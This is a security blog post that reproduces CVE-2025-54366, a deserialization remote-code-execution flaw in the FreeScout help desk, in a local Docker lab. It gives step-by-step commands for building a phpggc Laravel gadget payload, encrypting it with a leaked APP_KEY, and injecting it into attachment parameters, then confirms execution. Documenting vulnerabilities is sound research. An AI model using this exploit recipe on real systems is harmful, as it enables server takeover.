<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Reproducing insecure deserialization exploit for freescout CVE and reviwing the vulnerable code and fixes for it.">
<meta property="og:type" content="article">
<meta property="og:title" content="Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data">
<meta property="og:url" content="http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/">
<meta property="og:site_name" content="securitytaters">
<meta property="og:description" content="Reproducing insecure deserialization exploit for freescout CVE and reviwing the vulnerable code and fixes for it.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/new-convo.png">
<meta property="og:image" content="http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/access-convo.png">
<meta property="og:image" content="http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/attachment-req.png">
<meta property="og:image" content="http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/original-req.png">
<meta property="og:image" content="http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/edited-req.png">
<meta property="og:image" content="http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/fofa.png">
<meta property="og:image" content="http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/shodan.png">
<meta property="article:published_time" content="2025-08-10T04:30:00.000Z">
<meta property="article:modified_time" content="2025-08-14T05:29:07.375Z">
<meta property="article:author" content="0xm4v3rick">
<meta property="article:tag" content="web">
<meta property="article:tag" content="webappsec">
<meta property="article:tag" content="appsec">
<meta property="article:tag" content="laravel">
<meta property="article:tag" content="rce">
<meta property="article:tag" content="deserialization">
<meta property="article:tag" content="php">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/new-convo.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Archive</a></li><!--
     --><!--
       --><li><a href="/tags/">Tags</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/securitytaters">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/Solving-SaaS-from-ImaginaryCTF-2021/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/&text=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/&title=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/&is_video=false&description=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data&body=Check out this article: http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/&title=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/&title=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/&title=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/&title=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/&name=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data&description=Reproducing insecure deserialization exploit for freescout CVE and reviwing the vulnerable code and fixes for it."><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://securitytaters.github.io/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/&t=Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Setup"><span class="toc-number">2.</span> <span class="toc-text">Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Steps-to-Reproduce-the-CVE"><span class="toc-number">3.</span> <span class="toc-text">Steps to Reproduce the CVE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code-Review"><span class="toc-number">4.</span> <span class="toc-text">Code Review</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fix-for-the-vulnerability"><span class="toc-number">4.1.</span> <span class="toc-text">Fix for the vulnerability</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exposure-on-the-Web"><span class="toc-number">5.</span> <span class="toc-text">Exposure on the Web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">6.</span> <span class="toc-text">References</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Analyzing CVE-2025-54366 - RCE via Deserialization of untrusted data
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<p>Author : 
        <span class="p-name" itemprop="name">0xm4v3rick</span>
	</p>
      </span>
      
    <div class="postdate">
      
        Created: <time datetime="2025-08-10T04:30:00.000Z" class="dt-published" itemprop="datePublished">10-08-2025</time>
        
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/vulnerability-research/">vulnerability research</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/appsec/" rel="tag">appsec</a>, <a class="p-category" href="/tags/deserialization/" rel="tag">deserialization</a>, <a class="p-category" href="/tags/laravel/" rel="tag">laravel</a>, <a class="p-category" href="/tags/php/" rel="tag">php</a>, <a class="p-category" href="/tags/rce/" rel="tag">rce</a>, <a class="p-category" href="/tags/web/" rel="tag">web</a>, <a class="p-category" href="/tags/webappsec/" rel="tag">webappsec</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>Originally posted on my <a target="_blank" rel="noopener" href="https://github.com/securitytaters/vulnerability-research/tree/main/N-Day%20CVE/CVE-2025-54366">github</a></p>
<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Recently, a new CVE-2025-54366 was disclosed in <a target="_blank" rel="noopener" href="https://github.com/freescout-help-desk/freescout">freescout</a> - a free self-hosted help desk &amp; shared mailbox. This vulnerability involves using APP_KEY to craft a PHP serialized payload that will fire when it reaches <code>Helper::decrypt</code> function used in conversation flow. You can read more about APP_KEY and its exploitation at <a target="_blank" rel="noopener" href="https://blog.gitguardian.com/exploiting-public-app_key-leaks/">exploiting-public-app_key-leaks</a> and at <a target="_blank" rel="noopener" href="https://www.synacktiv.com/en/publications/laravel-appkey-leakage-analysis">laravel-appkey-leakage-analysis</a>. Below is my attempt at reproducing the CVE and my analysis of it in detail.</p>
<h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><p>In order to setup a vulnerable instance of freescout I used below docker-compose file. This is a slightly modified version of <a target="_blank" rel="noopener" href="https://github.com/tiredofit/docker-freescout/blob/main/examples/docker-compose-no-proxy.yml">this file</a>. I have updated the <code>image</code> <code>ports</code> and <code>SITE_URL</code> variables, keeping rest the same.</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">freescout-app:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">tiredofit/freescout:php8.3-1.17.122</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">freescout-app</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">9100</span><span class="string">:80</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">freescout-db</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">    <span class="comment">### If you want to perform customizations to the source and have access to it, then uncomment this line - This includes modules</span></span><br><span class="line">    <span class="comment">#- ./data:/www/html</span></span><br><span class="line">    <span class="comment">### Or, if you just want to use Stock Freescout and hold onto persistent files like cache and session use this, one or the other.</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">./data:/data</span></span><br><span class="line">    <span class="comment">### If you want to just keep the original source and add additional modules uncomment this line</span></span><br><span class="line">    <span class="comment">#- ./modules:/www/html/Modules</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">./logs/:/www/logs</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">CONTAINER_NAME=freescout-app</span></span><br><span class="line">    </span><br><span class="line">    <span class="bullet">-</span> <span class="string">DB_HOST=freescout-db</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">DB_NAME=freescout</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">DB_USER=freescout</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">DB_PASS=freescout</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="string">SITE_URL=http://localhost:9100</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ADMIN_EMAIL=admin@admin.com</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ADMIN_PASS=freescout</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">ENABLE_SSL_PROXY=FALSE</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">DISPLAY_ERRORS=FALSE</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">TIMEZONE=America/Vancouver</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">freescout-db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">tiredofit/mariadb</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">freescout-db</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./db:/var/lib/mysql</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ROOT_PASS=password</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_NAME=freescout</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_USER=freescout</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_PASS=freescout</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="string">CONTAINER_NAME=freescout-db</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">freescout-db-backup:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">freescout-db-backup</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">tiredofit/db-backup</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">freescout-db</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./dbbackup:/backup</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">CONTAINER_NAME=freescout-db-backup</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_HOST=freescout-db</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_TYPE=mariadb</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_NAME=freescout</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_USER=freescout</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_PASS=freescout</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB01_BACKUP_INTERVAL=1440</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB01_BACKUP_BEGIN=0000</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_CLEANUP_TIME=8640</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">COMPRESSION=BZ</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MD5=TRUE</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br></pre></td></tr></table></figure>

<p>Place the above file in your working directory and use below command to spin up instance of the freescout</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>

<p>The freescout portal will be available at <code>http://localhost:9100/</code>. For ease of exploitation you can proxy this to Burp Suite or any proxy of your choice. Login with credentials setup in the <code>ADMIN_EMAIL</code> and <code>ADMIN_PASS</code> variable in the docker-compose.yaml file.</p>
<h2 id="Steps-to-Reproduce-the-CVE"><a href="#Steps-to-Reproduce-the-CVE" class="headerlink" title="Steps to Reproduce the CVE"></a>Steps to Reproduce the CVE</h2><ol>
<li>We need to setup a few thing to reproduce the vulnerability and craft our RCE exploit. First, download and install <a target="_blank" rel="noopener" href="https://github.com/synacktiv/laravel-crypto-killer">laravel-crypto-killer</a> and <a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">phpggc</a></li>
<li>As mentioned in the advisory we need APP_KEY and a user account to exploit this issue. In a real world scenario you would need another vulnerability like LFI to access the .env file. For now we will just use the APP_KEY from our docker instance as shown below.</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/www/html <span class="comment"># cat .env </span></span><br><span class="line"><span class="comment">#### Automatically Generated File - Upon container restart any settings will reset!</span></span><br><span class="line">APP_URL=http://localhost:9100</span><br><span class="line">SESSION_SECURE_COOKIE=<span class="literal">false</span></span><br><span class="line">APP_DEBUG=<span class="literal">false</span></span><br><span class="line">APP_KEY=<span class="built_in">base64</span>:ZT6QMwgEO3PqeX/J3s2QmtR7bcmAi027xSW9bnHWPk8=</span><br><span class="line">DB_CONNECTION=mysql</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>Next we also need to know the Laravel version used by freescout. We use following command to do that.</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/www/html # php artisan --version</span><br><span class="line">Laravel Framework 5.5.40</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>Now we use phpggc to check for gadgets specific to our Laravel version as shown below.</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">php8.3 phpggc -l laravel</span><br><span class="line"></span><br><span class="line">Gadget Chains</span><br><span class="line">-------------</span><br><span class="line"></span><br><span class="line">NAME             VERSION                  TYPE                  VECTOR        I    </span><br><span class="line">Laravel/FD1      *                        File delete           __destruct    *    </span><br><span class="line">Laravel/RCE1     5.4.27                   RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE2     5.4.0 &lt;= 8.6.9+          RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE3     5.5.0 &lt;= 5.8.35          RCE: Function Call    __destruct    *    </span><br><span class="line">Laravel/RCE4     5.4.0 &lt;= 8.6.9+          RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE5     5.8.30                   RCE: PHP Code         __destruct    *    </span><br><span class="line">Laravel/RCE6     5.5.* &lt;= 5.8.35          RCE: PHP Code         __destruct    *    </span><br><span class="line">Laravel/RCE7     ? &lt;= 8.16.1              RCE: Function Call    __destruct    *    </span><br><span class="line">Laravel/RCE8     7.0.0 &lt;= 8.6.9+          RCE: Function Call    __destruct    *    </span><br><span class="line">Laravel/RCE9     5.4.0 &lt;= 9.1.8+          RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE10    5.6.0 &lt;= 9.1.8+          RCE: Function Call    __toString         </span><br><span class="line">Laravel/RCE11    5.4.0 &lt;= 9.1.8+          RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE12    5.8.35, 7.0.0, 9.3.10    RCE: Function Call    __destruct    *    </span><br><span class="line">Laravel/RCE13    5.3.0 &lt;= 9.5.1+          RCE: Function Call    __destruct    *    </span><br><span class="line">Laravel/RCE14    5.3.0 &lt;= 9.5.1+          RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE15    5.5.0 &lt;= v9.5.1+         RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE16    5.6.0 &lt;= v9.5.1+         RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE17    10.31.0                  RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE18    10.31.0                  RCE: PHP Code         __destruct    *    </span><br><span class="line">Laravel/RCE19    10.34                    RCE: Command          __destruct         </span><br><span class="line">Laravel/RCE20    5.6 &lt;= 10.x              RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE21    5.1.*                    RCE: Function Call    __destruct         </span><br><span class="line">Laravel/RCE22    v10.0.0 &lt;= v11.34.2+     RCE: Function Call    __destruct         </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<ol start="7">
<li>We can use Laravel&#x2F;RCE4 as that matches our version of Laravel. Next we create our payload using following command. Once run it will create a file named <code>rce</code> in <code>/tmp/</code> directory. <code>-b</code> option encodes our payload into base64 format.</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php8.3 phpggc Laravel/RCE4 system &quot;touch /tmp/rce&quot; -b</span><br><span class="line">Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MzE6IklsbHVtaW5hdGVcVmFsaWRhdGlvblxWYWxpZGF0b3IiOjE6e3M6MTA6ImV4dGVuc2lvbnMiO2E6MTp7czowOiIiO3M6Njoic3lzdGVtIjt9fXM6ODoiACoAZXZlbnQiO3M6MTQ6InRvdWNoIC90bXAvcmNlIjt9</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>Next we need to encrypt this payload using laravel-crypto-killer tool as shown below using the APP_KEY. This is our final payload.</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python laravel_crypto_killer.py encrypt -k base64:ZT6QMwgEO3PqeX/J3s2QmtR7bcmAi027xSW9bnHWPk8= -v Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MzE6IklsbHVtaW5hdGVcVmFsaWRhdGlvblxWYWxpZGF0b3IiOjE6e3M6MTA6ImV4dGVuc2lvbnMiO2E6MTp7czowOiIiO3M6Njoic3lzdGVtIjt9fXM6ODoiACoAZXZlbnQiO3M6MTQ6InRvdWNoIC90bXAvcmNlIjt9</span><br><span class="line"></span><br><span class="line">[+] Here is your laravel ciphered value, happy hacking mate!</span><br><span class="line">eyJpdiI6ICJQVmczZ09janUweEFHWVpjRWc3bkhRPT0iLCAidmFsdWUiOiAiSmg3N00wNHVjT1NabmdBdFlOZ0RKVVcyMlIwUUp3ZTMyT09qbE5iKzV1Y1hXZTU3RHcwSmdaUWZVN2RhQUt3cHlYc0tON1ZJOE5PRUVFWjB5MGk1b2N6QlBRNzZJanlZclQ3K1JrVlBpNTUyd1NMeUg5NmRzNll3cDJ0Q3lFdzhsVENjYkN6RWViNGVhMHE5THNxdmFvc1dCYTBQb3gvYis4YVpnZEJaWkR5TGwyWGtwSGM2N3R0QmFhTXlmMEIvd09MQ3pPakNBUU56MlNpMVZZTEhLRGZjdjVWeWJ0dmMycTlNbkZlQzlYWTdwTkhqYi9md0NmUDRDekRybkIwNUlkSzczM3VXclFNMklGRnVlT1lTQkE9PSIsICJtYWMiOiAiMmY2ZGEyYzJmY2IwYTBiMjI5ZTdmNDUwMzQ5NTU5Y2NlYmJlYzY3NzgzMmUzMDFjY2M0ZmQyMGJmODBkY2RmNiIsICJ0YWciOiAiIn0=</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="9">
<li>Based the PoC request in the CVE advisory, the vulnerable endpoint is <code>conversation/ajax</code>. To reach there we need create our first mailbox. When we login for the first time it walks us through the creation of mailbox. This also creates an email ID for e.g. <code>support@localhost.com</code> which we will use.</li>
<li>Next we create conversation with the with any email ID. We will use the one created in the above step. It can be done by visiting the <a target="_blank" rel="noopener" href="http://localhost:9100/mailbox/1/new-ticket">http://localhost:9100/mailbox/1/new-ticket</a> endpoint or from the side menu. Enter the <code>To</code> and <code>Subject</code> and anything in the body similar to below screenshot.</li>
</ol>
<p><img src="/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/new-convo.png" alt="new-convo"></p>
<ol start="11">
<li>Now access the conversation as shown below.</li>
</ol>
<p><img src="/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/access-convo.png" alt="access-convo"></p>
<ol start="12">
<li>Here is a slightly tricky part. Now reply to this conversation with an any attachment. Once you reach the point 3 as shown in below image, we need to have the intercept on in the Burp Suite proxy to capture the request on point 4. Otherwise the request goes through in the background and we do not get the initial request we need to exploit the RCE. This is the request that will give us the vulnerable parameters <code>attachments_all[]</code> and <code>attachments[]</code> on <code>conversation/ajax</code> endpoint.</li>
</ol>
<p><img src="/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/attachment-req.png" alt="attachment-req"></p>
<ol start="12">
<li>Once you capture the request send it to repeater using <code>Ctrl+r</code> shortcut. Below is the original request with the parameters we need for our payload.</li>
</ol>
<p><img src="/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/original-req.png" alt="original-req"></p>
<ol start="13">
<li>Next we update the highlighted parameters with the final payload we created earlier as shown below. Ensure the payload is URL encoded if needed and send the request. Its the case for me as my final payload has a trailing <code>=</code>. Once done you will something like below as sign of successful exploitation.</li>
</ol>
<p><img src="/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/edited-req.png" alt="edited-req"></p>
<ol start="14">
<li>Next we verify that the file was created in our docker instance as shown below confirming remote code execution.</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ # ls -l /tmp/</span><br><span class="line">total 0</span><br><span class="line">-rw-r--r--    1 nginx    www-data         0 Jul 29 22:32 rce</span><br><span class="line">/ # </span><br></pre></td></tr></table></figure>

